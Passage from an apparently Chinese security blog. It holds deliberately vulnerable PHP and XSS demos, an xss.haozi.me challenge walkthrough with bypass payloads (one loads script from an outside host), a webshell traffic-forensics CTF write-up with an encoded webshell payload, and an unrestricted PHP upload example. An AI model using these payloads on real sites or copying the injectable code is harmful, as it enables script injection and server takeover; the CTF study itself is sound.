<h3 id="XSS漏洞简单攻击测试源码"><a href="#XSS漏洞简单攻击测试源码" class="headerlink" title="XSS漏洞简单攻击测试源码"></a>XSS漏洞简单攻击测试源码</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;反射型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">//后端 action.php：</span><br><span class="line">&lt;?php</span><br><span class="line">    $name=$_POST[&quot;name&quot;]; </span><br><span class="line">	echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
<p>所以，我们可以在输入框中提交数据： <code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code> </p>
<p>页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。<br>这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： <code>前端--&gt;后端--&gt;前端</code></p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//前端：2.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;存储型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        输入你的ID：  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        输入你的Name：&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//后端：action2.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$id=$_POST[&quot;id&quot;];</span><br><span class="line">	$name=$_POST[&quot;name&quot;];</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	</span><br><span class="line">	$sql=&quot;insert into xss value ($id,&#x27;$name&#x27;)&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">?&gt;</span><br><span class="line">//供其他用户访问页面：show2.php</span><br><span class="line">&lt;?php</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	$sql=&quot;select * from xss where id=1&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	while($row=mysql_fetch_array($result))&#123;</span><br><span class="line">		echo $row[&#x27;name&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。</p>
<p>我们输入 <code>1</code>  和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code>  ，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，XSS语句就已经插入到数据库中<br>然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。<br>存储型XSS的数据流向是：前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</p>
<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 前端3.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;DOM型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action3.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">// 后端action3.php</span><br><span class="line">&lt;?php</span><br><span class="line">  $name=$_POST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">  var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">  print.innerHTML=text.value;  // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
<p>我们可以输入 <code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code>  </p>
<p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。<br>这就是DOM型XSS漏洞，这种漏洞数据流向是： 前端–&gt;浏览器</p>
<h3 id="XSS刷题笔记"><a href="#XSS刷题笔记" class="headerlink" title="XSS刷题笔记"></a>XSS刷题笔记</h3><p>这一部分是<a href="https://xss.haozi.me/%E7%9A%84wp">https://xss.haozi.me/的wp</a></p>
<p>这里边主要训练了一些XSS的简单题目</p>
<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>常规题目，直接<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>结束战斗</p>
<p>或者<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<p>(下述题目两种方式均可互换，不再一一说明)</p>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>先来个<code>&lt;/textarea&gt;</code>与前边的<code>&lt;textarea&gt;</code>闭合，然后再<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>当然你也可以用一个标签结束战斗<code>&lt;/textarea&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;textarea&gt;</code></p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>先来个<code>&quot;&gt;</code>与前边的<code>&quot;</code>及<code>&lt;</code>闭合，然后再<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>同样，可以一个标签结束<code>&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>后端代码来看，过滤了<code>()</code></p>
<p>我们可以用``代替</p>
<p><img src="https://img-blog.csdnimg.cn/4df93d2e3adb46ebb24c31c79c27a86c.png"></p>
<p>或者是<code>&lt;img src=&quot;x&quot; onerror=&quot;alert</code>1<code>&quot;&gt;</code></p>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>这题过滤了()和``</p>
<p>考虑使用HTML</p>
<p>这题考虑HTML编码绕过，来到<a href="http://www.gjw123.com/tools-htmlende">这里</a></p>
<p><img src="https://img-blog.csdnimg.cn/5fb948a5d7af4738a57ff5fb857e6481.png"></p>
<p>我们需要用svg标签可以直接执行HTML实体字符</p>
<p>所以答案为<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code>或者<code>&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;</code></p>
<h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>并不是只要<code>--&gt;</code>才能闭合<code>&lt;!--</code>,<code>--!&gt;</code>也能闭合，直接闭合一下，然后就好了<code>--!&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<p><img src="https://img-blog.csdnimg.cn/ccb110bb5dcf4473be22193ad7e48b44.png"></p>
<h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p>此关是将所有以<code>auto</code>或者<code>on</code>开头的且以<code>=</code>或<code>&gt;</code>结尾的属性替换成<code>_</code>后直接输出，且匹配是不考虑大小写</p>
<p>所以过滤了<a href="https://www.w3school.com.cn/tags/att_input_autofocus.asp">autofocus</a>和<a href="https://www.runoob.com/jsref/event-onerror-media.html">onerror</a>、<a href="https://www.runoob.com/jsref/event-onmousemove.html">onmousemove</a>事件, 以及防止input标签被闭合</p>
<p>这里查到可以使用换行符来绕过，因为<code>Javascript</code>通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略,而如果不是完整的语句，<code>javascript</code>则会继续处理，直到语句完整结束或分号<img src="https://img-blog.csdnimg.cn/93c6cb91324a4a2091027890fcabf4a9.png"></p>
<h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h4><p>此关是对于以<code>&lt;/</code>开头后接任意0个或1个非<code>&gt;</code>字符且以<code>&gt;</code>结尾的字符串进行过滤，且不考虑大小写，即过滤了以<code>&lt;&gt;</code>包裹的标签</p>
<p>由于<code>html</code>的容错性很高，对于标签不闭合也可以接受(网上说这只是<code>html4</code>时的无尾标签特性，而<code>html5</code>时就将其去除了，不知道为啥这里还能执行成功)，这里就直接使用不闭合的语句就能成功弹窗</p>
<p><img src="https://img-blog.csdnimg.cn/f9ab1e2d663d40079814c69da291ad3d.png"></p>
<h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这题把<code>&lt;/style&gt;</code>替换了，也就是过滤了，其实还是第五题考点，换行绕过就行</p>
<p><img src="https://img-blog.csdnimg.cn/a604dd59f4474e7ab5a001ee27045f1a.png"></p>
<h4 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h4><p>这关没有做黑名单，反而做了白名单</p>
<p><img src="https://img-blog.csdnimg.cn/172615e1ee564541945cd5257a8c08fa.png"></p>
<h4 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h4><p>我采用了最原始的方法，闭合标签</p>
<p><img src="https://img-blog.csdnimg.cn/007ee376dbbf4457a3d60f84baf3d298.png"></p>
<p>看别人的blog，有简单方法，好吧还是我HTML不如大佬了</p>
<p><img src="https://img-blog.csdnimg.cn/9407c26b2e244baa955470cff164c24e.png"></p>
<h4 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h4><p>“被替换成了/“，并没有什么用啊，还是可以闭合</p>
<p><img src="https://img-blog.csdnimg.cn/43b94c318236458daf845070f7cc74bd.png"></p>
<p> //虽然被转义成了//, 但转义之后还是//, 在js中还是注释符 </p>
<h4 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h4><p>在我看来内嵌一个标签是最简单粗暴的方法，只要<code>&lt;&gt;</code> 没有被过滤就好</p>
<p><img src="https://img-blog.csdnimg.cn/8dd61efce8a544998304673c92385658.png"></p>
<p>当然也可以想办法绕过，闭合一下，”被替换成\“ ，怎么办？</p>
<p>语文上有双重否定表示肯定，数学上有负负得正，那么</p>
<p><img src="https://img-blog.csdnimg.cn/222e449f20c34f06b4864e4504d8912e.png"></p>
<h4 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h4><p>这又用到一个知识点，就是@，如果你访问 <a href="mailto:www.baidu.com@www.google.com">www.baidu.com@www.google.com</a>，那么你最后进入的是谷歌的界面，所以这一关，就在自己的服务器上放一个js文件，写上alert(1);这里你可以用我的<code>charmersix.icu/xss.js</code>我看题目作者的库里也留了个，也可以用作者的<code>http://xss.haozi.me/j.js</code></p>
<p>这里刚开始在chrome上死活打不通，但是换到Firefox就好了，edge也打不通</p>
<p><img src="https://img-blog.csdnimg.cn/5284f64f7ac74ba5906a814e143da0df.png"></p>
<h4 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h4><p>此关使用<code>toUpperCase</code>函数对于输入进行了转成大写的操作</p>
<p>对于大小写的问题，<code>html</code> 标签, 域名 不区分大小写，<code>path</code>部分区分大小写。</p>
<p><code>uniocde</code>编码也可以解决绕过大小写,因为<code>js</code>解析器在工作时回对<code>unicode</code>先进行解码，例如这里会被先解析成<code>alert(1)</code>从而实现弹窗</p>
<p><code>html</code>中<code>unicode</code>编码格式：&amp;#编码的十进制数值，一般的格式还有直接<code>\u</code>开头的<code>16</code>进制四位编码，一定是四位，否则报错</p>
<p><img src="https://img-blog.csdnimg.cn/dac7647a03b343978403eac97a7b895f.png"></p>
<p>还有一种题解，延续上一题的做法，因为域名是对大小写不敏感的</p>
<h4 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h4><p>多过滤了一个script，并没有什么影响，上题题解仍然可用</p>
<h4 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h4><p>此关是对于输入的<code>&lt; / &quot; &#39;</code>等进行了过滤，将其转换成空，并且在输入处进行了单行注释，这里可以通过使用换行符进行绕过，但换行仅能过单行注释，代码还是不能正常运行，这里可使用<code>html</code>注释<br><code>--&gt;</code>来注释后面的<code>js</code>，使代码正常运行</p>
<p>对于这里使用<code>html</code>的注释符也能闭合<code>js</code>单行注释，查了一下，发现说对于那些不支持<code>JavaScript</code>的浏览器会把脚本作为页面的内容来显示;为了防止这种情况发生，我们可以使用这样的<code>HTML</code>注释标签</p>
<p>可以看到这里就是使用了<code>html</code>标签闭合的<code>js</code>,对于<code>&lt;!--</code>和<code>--&gt;</code>都可以在<code>html</code>的<code>script</code>标签里单独使用进行单行注释，这里<code>&lt;</code>被过滤了，所以使用<code>--&gt;</code></p>
<p><img src="https://img-blog.csdnimg.cn/84e0d8037d3d489eb1cdf4e25e0c9edd.png"></p>
<h4 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h4><p>此关对于所有以<code>&lt;</code>开头的加任意大小写字符的进行替换为<code>&lt;_</code>且再将所有小写字母换成大写</p>
<p>这里参考官方题解后学到了一些骚操作，对于<code>ſ</code>古英语中的<code>s</code>的写法, 转成大写是正常的<code>S</code>,从而可以绕过<code>&lt;script&gt;</code>限制</p>
<p><img src="https://img-blog.csdnimg.cn/82d42e722b564e49b18d269a48eb3bd2.png"></p>
<h4 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h4><p>此关还是对于输入的一些符号进行了编码操作，但对<code>html inline js</code>转义没有什么用，浏览器会先解析<code>html</code>, 然后再解析<code>js</code></p>
<p>但是由于输入信息是在<code>img</code>标签内，所以<code>html</code>实体编码是可以被直接解析的,所以闭合前面的标签，在构造语句即可，这里<code>onerror</code>后面用分号闭合后感觉类型堆叠执行一样。</p>
<p><img src="https://img-blog.csdnimg.cn/21cf7a221e6f43bb9df079780f23c7cb.png"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021) webshell系列</title>
    <url>/2022/04/29/webshell/</url>
    <content><![CDATA[<p>这是一个大赛原题系列，总共七道题，题目在<a href="http://ctfer.club/challenges#[%E9%99%87%E5%89%91%E6%9D%AF%202021]webshell%EF%BC%88%E9%97%AE1%EF%BC%89-88">这儿</a></p>
<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a><a href="http://ctfer.club/challenges#[%E9%99%87%E5%89%91%E6%9D%AF%202021]webshell%EF%BC%88%E9%97%AE1%EF%BC%89-88">（1）</a></h3><p>webshell ，想一想，应该是post传输，筛选一下post</p>
<p><img src="https://img-blog.csdnimg.cn/ff898474bad8463391a5d631b58b3f59.png" alt="ws1.1.png"></p>
<p>随便点开第一个看一下</p>
<p><img src="https://img-blog.csdnimg.cn/d4eec08bbc9b43d59b4f3ed1bc2e78b6.png"></p>
<p>就有了，或者搜索一下password也可以</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>绝对路径的话有两个部分组成，一个是网站根目录，另一个是相对路径</p>
<p>导出HTTP对象，一个个找，在index.php%3fm=home&amp;a=assign_resume_tpl文件中发现了含有phpinfo()页面的东西</p>
<p><img src="https://img-blog.csdnimg.cn/2c42b116b7f74c7691be0e53929518f5.png"></p>
<p>将其后缀变更为.html用浏览器打开，先查找网站根路径为/var/www/html</p>
<p><img src="https://img-blog.csdnimg.cn/dba562a9c22244738cb851e2de52850f.png"></p>
<p>在PHP变量中查找.log后缀的日志文件，路径为data/Runtime/Logs/Home/21_08_07.log，两个拼起来就是答案</p>
<p><img src="https://img-blog.csdnimg.cn/55d6ef0a455d4bf080ff14aa79111a0c.png"></p>
<p>我看别人也有这样做的</p>
<p>筛选post，（1）里说过</p>
<p>跟包，跟到332</p>
<p><img src="https://img-blog.csdnimg.cn/f240d306007346b29ce3756983708a12.png"></p>
<p>拼接一下就有了</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>说到权限，可能会执行whoami命令，我们全局搜索whoami，找到第317号数据请求包中包含 whoami命令，第319号响应包中包含结果</p>
<p><img src="https://img-blog.csdnimg.cn/50adfcce3a484a4e90154b7ce37675cf.png#pic_center"></p>
<p>根据（2）的phpinfo()，其实可以得到很多东西，比如这一题的答案</p>
<p><img src="https://img-blog.csdnimg.cn/f3ec412d83eb4377af547681cd0ef26a.png#pic_center"></p>
<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>借助（2）的分析，很容易就能得到</p>
<p>答案是1.php</p>
<h3 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h3><p>第一种方法是猜测，一般来说代理工具客户端就是frpc，然后搜索一下，还真是</p>
<p><img src="https://img-blog.csdnimg.cn/897ef53484594f13b7f380087d18dff6.png#pic_center"></p>
<p>第二种方法，充分利用wireshark 导出对象的功能，导出HTTP对象，然后保存下来</p>
<p>1(51).php就是查看上传后的木马文件目录</p>
<p><img src="https://img-blog.csdnimg.cn/4e5cde1d3c354fe7a684b350455ca36f.png#pic_center"></p>
<p>还有一种方法是我最不推荐的，不好理解，也有点麻烦</p>
<p>学习了别的师傅的WP，</p>
<p>将344包TCP流Urldecode，发现一个<a href="https://link.zhihu.com/?target=https://baike.baidu.com/item/SUBSTR()%E5%87%BD%E6%95%B0/2694062?fr=aladdin">substr</a>,从第2位开始截取，所以下面类似base64的编码去掉前两位（截图中少复制一个%3D，末尾缺个等号）然后继续urldecode一波。</p>
<p><img src="https://img-blog.csdnimg.cn/0d41fe56d8f54ea69b2043f1f933015c.png#pic_center"></p>
<p>然后继续urldecode一波（需要用可以解码特殊字符的，强烈安利<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('A-Za-z0-9%2B/%3D',true)&input=TDNaaGNpOTNkM2N2YUhSdGJDOW1jbkJqTG1sdWFRPT0">CyberChef</a>）</p>
<p><img src="https://img-blog.csdnimg.cn/95810334d3114712939e437a4663cc7c.png#pic_center"></p>
<h3 id="（6）（7）"><a href="#（6）（7）" class="headerlink" title="（6）（7）"></a>（6）（7）</h3><p>这一题，咱们采用（2）中相同的做法，把所有的HTTP对象导出，然后挨个看，就会发现1(6).php中有个aaa=</p>
<p>就很有可能是上传的袋里配置文件。</p>
<p><img src="https://img-blog.csdnimg.cn/e06379629a5c4adc88742a53fb4ed7bd.png#pic_center"></p>
<p>（当然这题你也可以追踪流来看，如果不嫌麻烦的话）</p>
<p>还是<a href="https://ctf.mzy0.com/CyberChef3/#recipe=URL_Decode()From_Hex%EF%BC%8816%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89('Auto')&input=JTQwaW5pX3NldCglMjJkaXNwbGF5X2Vycm9ycyUyMiUyQyUyMCUyMjAlMjIpJTNCJTQwc2V0X3RpbWVfbGltaXQoMCklM0JmdW5jdGlvbiUyMGFzZW5jKCUyNG91dCklN0JyZXR1cm4lMjAlMjRvdXQlM0IlN0QlM0JmdW5jdGlvbiUyMGFzb3V0cHV0KCklN0IlMjRvdXRwdXQlM0RvYl9nZXRfY29udGVudHMoKSUzQm9iX2VuZF9jbGVhbigpJTNCZWNobyUyMCUyMjI4JTIyLiUyMmY3MiUyMiUzQmVjaG8lMjAlNDBhc2VuYyglMjRvdXRwdXQpJTNCZWNobyUyMCUyMmY0ODYlMjIuJTIyMTFmNCUyMiUzQiU3RG9iX3N0YXJ0KCklM0J0cnklN0IlMjRmJTNEYmFzZTY0X2RlY29kZShzdWJzdHIoJTI0X1BPU1QlNUIlMjJqNjgwNzEzMDE1OThmJTIyJTVEJTJDMikpJTNCJTI0YyUzRCUyNF9QT1NUJTVCJTIyeGE1ZDYwNmU2Nzg4M2ElMjIlNUQlM0IlMjRjJTNEc3RyX3JlcGxhY2UoJTIyJTVDciUyMiUyQyUyMiUyMiUyQyUyNGMpJTNCJTI0YyUzRHN0cl9yZXBsYWNlKCUyMiU1Q24lMjIlMkMlMjIlMjIlMkMlMjRjKSUzQiUyNGJ1ZiUzRCUyMiUyMiUzQmZvciglMjRpJTNEMCUzQiUyNGklM0NzdHJsZW4oJTI0YyklM0IlMjRpJTJCJTNEMiklMjRidWYuJTNEdXJsZGVjb2RlKCUyMiUyNSUyMi5zdWJzdHIoJTI0YyUyQyUyNGklMkMyKSklM0JlY2hvKCU0MGZ3cml0ZShmb3BlbiglMjRmJTJDJTIyYSUyMiklMkMlMjRidWYpJTNGJTIyMSUyMiUzQSUyMjAlMjIpJTNCJTNCJTdEY2F0Y2goRXhjZXB0aW9uJTIwJTI0ZSklN0JlY2hvJTIwJTIyRVJST1IlM0ElMkYlMkYlMjIuJTI0ZS0lM0VnZXRNZXNzYWdlKCklM0IlN0QlM0Jhc291dHB1dCgpJTNCZGllKCklM0ImajY4MDcxMzAxNTk4Zj1GQkwzWmhjaTkzZDNjdmFIUnRiQzltY25CakxtbHVhUSUzRCUzRCZ4YTVkNjA2ZTY3ODgzYT01QjYzNkY2RDZENkY2RTVEMEE3MzY1NzI3NjY1NzI1RjYxNjQ2NDcyMjAzRDIwMzEzOTMyMkUzMTM2MzgyRTMyMzMzOTJFMzEzMjMzMEE3MzY1NzI3NjY1NzI1RjcwNkY3Mjc0MjAzRDIwMzczNzM3MzgwQTc0NkY2QjY1NkUzRDU4NjEzMzQyNEE2NjMyNkMzNTY1NkU2RDRFMzY1QTM3NDEzODZENzYwQTBBNUI3NDY1NzM3NDVGNzM2RjYzNkIzNTVEMEE3NDc5NzA2NTIwM0QyMDc0NjM3MDBBNzI2NTZENkY3NDY1NUY3MDZGNzI3NDIwM0QzODMxMzEzMTBBNzA2Qzc1Njc2OTZFMjAzRDIwNzM2RjYzNkI3MzM1MEE3MDZDNzU2NzY5NkU1Rjc1NzM2NTcyMjAzRDIwMzA0ODQ0NDY3NDMxMzY2MzRDNTE0QTBBNzA2Qzc1Njc2OTZFNUY3MDYxNzM3Mzc3NjQyMDNEMjA0QTU0NEUzMjM3MzY0NzcwMEE3NTczNjU1RjY1NkU2MzcyNzk3MDc0Njk2RjZFMjAzRDIwNzQ3Mjc1NjUwQTc1NzM2NTVGNjM2RjZENzA3MjY1NzM3MzY5NkY2RTIwM0QyMDc0NzI3NTY1MEE">CyberChef</a></p>
<p>解码一下，就能发现这题的flag</p>
<p>同时，会惊奇的发现（7）的flag</p>
<p><img src="https://img-blog.csdnimg.cn/68ca6e3fc49b49cfaf8e5f7b7aa2ee18.png#pic_center"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_4_PHP文件上传</title>
    <url>/2022/09/20/web_4/</url>
    <content><![CDATA[<h2 id="第一节-php文件上传"><a href="#第一节-php文件上传" class="headerlink" title="第一节 php文件上传"></a>第一节 php文件上传</h2><h3 id="0x1-php文件上传机制"><a href="#0x1-php文件上传机制" class="headerlink" title="0x1 php文件上传机制"></a>0x1 php文件上传机制</h3><p>php使用临时文件移动的方式来上传文件，通过<code>$_FILES</code>数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的<code>/tmp/php??????</code>文件使用<code>move_uploaded_file</code>函数来移动到新的位置。</p>
<p>文件上传信息包含的数组<code>$_FILES</code>数组中，是支持多文件同时上传的。默认情况下，上传的名字为<code>file</code>,所以我们可以在<code>$_FILES[&#39;file&#39;]</code>这个数组中获得，我们可以获得以下信息</p>
<ul>
<li><code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>获得上传文件的原始文件名</li>
<li><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>上传的文件在临时目录中的文件名</li>
<li><code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>上传文件的大小，单位为字节</li>
<li><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>上传文件的类型</li>
</ul>
<h3 id="0x2-文件上传的例子"><a href="#0x2-文件上传的例子" class="headerlink" title="0x2 文件上传的例子"></a>0x2 文件上传的例子</h3><h4 id="文件上传表单"><a href="#文件上传表单" class="headerlink" title="文件上传表单"></a>文件上传表单</h4><p>表单是一种HTML代码，表示向某个地址发送一个或多个数据，数据格式可以分为几种</p>
<p><code>get表单</code>数据附加在url后</p>
<p><code>post表单</code>将数据附加到http包中，发送的数据是经过url编码过的</p>
<p><code>raw表单</code>将数据直接附加到http请求包中，不存在键值对，直接是数据，常见的方式是<code>file_get_contents(&quot;php://input&quot;)</code>这种请求是和post表单互斥的</p>
<p><code>json表单</code>类型为<code>application/json</code>，常见于api接口</p>
<h4 id="文件上传的例子"><a href="#文件上传的例子" class="headerlink" title="文件上传的例子"></a>文件上传的例子</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp_file</span> =  <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dist_file</span> = <span class="string">&quot;./upload/&quot;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_file</span>,<span class="variable">$dist_file</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件上传成功&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件上传失败&quot;</span>;</span><br><span 